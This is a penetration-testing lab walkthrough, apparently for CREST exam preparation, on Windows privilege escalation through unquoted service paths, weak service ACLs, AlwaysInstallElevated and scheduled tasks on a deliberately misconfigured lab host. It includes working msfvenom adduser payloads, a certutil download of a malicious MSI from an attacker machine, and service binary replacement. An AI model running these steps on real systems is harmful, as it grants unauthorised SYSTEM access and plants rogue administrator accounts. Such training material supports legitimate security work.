Windows Privilege Escalation - Services and Registry

Identify and exploit Windows privilege escalation vectors on SYNTEX-DC01: unquoted service paths, weak service ACLs, and the AlwaysInstallElevated registry policy. Each technique targets a different class of Windows misconfiguration.

Scenario

You have a low-privilege foothold on SYNTEX-DC01 as a domain user. Before escalating privileges, you perform a systematic check of Windows misconfigurations. SYNTEX-DC01 has been intentionally misconfigured with three privilege escalation vectors. Your objective is to identify and exploit each one, documenting proof of SYSTEM access. In a real engagement, SYSTEM on a domain controller is full domain compromise.

Phase 1 - Windows Privesc Enumeration
1
Unquoted Service Paths

When a Windows service binary path contains spaces and is not enclosed in quotes, Windows tries to resolve the path ambiguously. An attacker can place a binary in one of the attempted locations to intercept service execution as SYSTEM.

# Find services with unquoted paths (Command Prompt)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# PowerShell alternative
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notlike '"*"' -and
    $_.PathName -match ' ' -and
    $_.PathName -notmatch '^C:\\Windows'
} | Select-Object Name,PathName,StartMode

# Show all services and their paths
sc qc SyntexUpdater

Example of a vulnerable path:

BINARY_PATH_NAME: C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe

Windows attempts these paths in order:

C:\Program.exe
C:\Program Files\Syntex.exe
C:\Program Files\Syntex Solutions\Update.exe
C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe
★
CREST Exam Point: For unquoted service path findings, document the exact service name, the unquoted path, the specific locations Windows would attempt, and whether you have write access to any of those parent directories. Use icacls to check directory permissions. The finding title is "Unquoted Service Path Allows Privilege Escalation".

2
Service Binary ACL Check

If a low-privilege user has write access to a service binary, they can replace it with a malicious binary that runs as SYSTEM when the service starts.

# Check ACLs on a service binary
icacls "C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe"

# Check ACLs on the service directory
icacls "C:\Program Files\Syntex Solutions\Update Service\"

# PowerShell - check all service binaries
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"', '' -replace ' .*', ''
    if (Test-Path $path) {
        $acl = Get-Acl $path
        $acl.Access | Where-Object {
            $_.FileSystemRights -match 'Write|FullControl' -and
            $_.IdentityReference -notmatch 'SYSTEM|Administrators|TrustedInstaller'
        } | Select-Object @{N='Service';E={$_.Name}},IdentityReference,FileSystemRights
    }
}
ℹ
Reading icacls output: Look for (F) (Full Control), (M) (Modify), or (W) (Write) for groups like BUILTIN\Users, Everyone, or NT AUTHORITY\Authenticated Users. Any of these on a service binary is a critical finding.

3
AlwaysInstallElevated Registry Check

When both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1, any user can install MSI packages with SYSTEM privileges. This is a well-known but frequently misconfigured policy.

# Check both registry keys (both must be 1 for exploitation)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, the setting is enabled
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
AlwaysInstallElevated check
4
Scheduled Task Script Permissions

Scheduled tasks running as SYSTEM that reference writable scripts are equivalent to the Linux cron attack from B13-A.

# List all scheduled tasks
schtasks /query /fo LIST /v

# PowerShell - tasks running as SYSTEM
Get-ScheduledTask | Where-Object {
    $_.Principal.UserId -match 'SYSTEM'
} | Select-Object TaskName,TaskPath

# Check ACLs on a specific task's script
icacls "C:\Syntex\Scripts\maintenance.ps1"

Phase 2 - Exploitation
5
AlwaysInstallElevated - Craft and Execute Malicious MSI

Use msfvenom to generate a malicious MSI that adds a local admin user. When installed via msiexec by a low-privilege user, it runs with SYSTEM privileges.

# On Kali - generate the malicious MSI
msfvenom -p windows/adduser USER=hacked PASS=Hacked123! -f msi -o /tmp/evil.msi

# Transfer to the target (via SMB share, HTTP server, etc.)
# Example: host on Kali with Python
python3 -m http.server 8080

# On the target - download and run
certutil -urlcache -f http://<KALI-IP>:8080/evil.msi C:\Temp\evil.msi

# Install silently - will run as SYSTEM due to AlwaysInstallElevated
msiexec /quiet /qn /i C:\Temp\evil.msi

# Verify the new admin account was created
net user hacked
net localgroup administrators
★
CREST Exam Point: The AlwaysInstallElevated finding requires both keys to be set. Document both registry values as evidence. The exploit proof is the creation of the local admin account and a whoami /all output from that account showing the elevated privileges. Finding title: "AlwaysInstallElevated Policy Enables Privilege Escalation to SYSTEM".
AlwaysInstallElevated exploitation result
6
Weak Service Binary ACL - Replace and Execute

If you have write access to a service binary, replace it with a command that adds a local admin, then restart the service to trigger execution as SYSTEM.

# On Kali - generate a binary payload
msfvenom -p windows/adduser USER=svcadmin PASS=SvcAdmin123! -f exe -o /tmp/SyntexUpdater.exe

# Transfer to the target
# Back up the original binary first
copy "C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe" C:\Temp\SyntexUpdater.exe.bak

# Replace the binary
copy /y C:\Temp\evil_updater.exe "C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe"

# Restart the service to trigger execution
sc stop SyntexUpdater
sc start SyntexUpdater

# Check if the new admin was created
net localgroup administrators
⚠
Always restore originals: In a real engagement, after demonstrating the vulnerability, restore the original binary immediately. Document the finding, take screenshots, and restore. Leaving systems in an exploited state violates rules of engagement.
